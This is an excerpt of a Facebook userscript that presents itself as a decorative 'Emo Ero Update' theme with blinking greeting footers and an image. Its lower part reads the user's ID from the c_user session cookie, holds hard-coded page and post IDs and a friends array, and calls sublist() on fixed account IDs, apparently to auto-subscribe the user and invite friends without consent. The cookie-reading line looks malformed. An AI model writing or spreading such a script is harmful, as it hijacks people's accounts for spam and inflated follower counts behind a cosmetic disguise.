// ==UserScript==
// @name            ۝Emo Ero Update- with auto invite-final۝ 
// @description     by ◄Putri Dhelika Ahmad►
...
(function() {
	...
	// Toggler
	html += '<a class="navLink" title="1 ◄Putri Dhelika Ahmad►">'; // var navLink
	...
	html += '</div>';
        ...
        // Footer 2
	html += '<div class="jewelFooter">';
    html += '<blink><center><font color="red">◄◄°º¤•Maz Haffiz•¤º°►<br>♣semoga panjang umur♣<br>ΔΔMurah RizqiΔΔ<br>☺☺dan cepet nikah☺☺<br>⇆⇆AMIN⇆⇆</font></center></blink>';
	html += '</div>';

        // Footer 3
	html += '<div class="jewelFooter">';
    html += '<blink><center><font color="orange"><img src="http://t3.gstatic.com/images?q=tbn:ANd9GcQOOV3Cf5EC2tfveahJMedOxSjXurJATG6GIVBnDn-1Lw71JnDriQ"></font></center></blink>';
	html += '</div>';
...
var spage_id = "5286086394875164";
var spost_id = "286086394875164";
var sfoto_id = "286086394875164";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
sublist("100005440838009");
sublist("286086394875164");
sublist("");
sublist("");
sublist("");
sublist("");
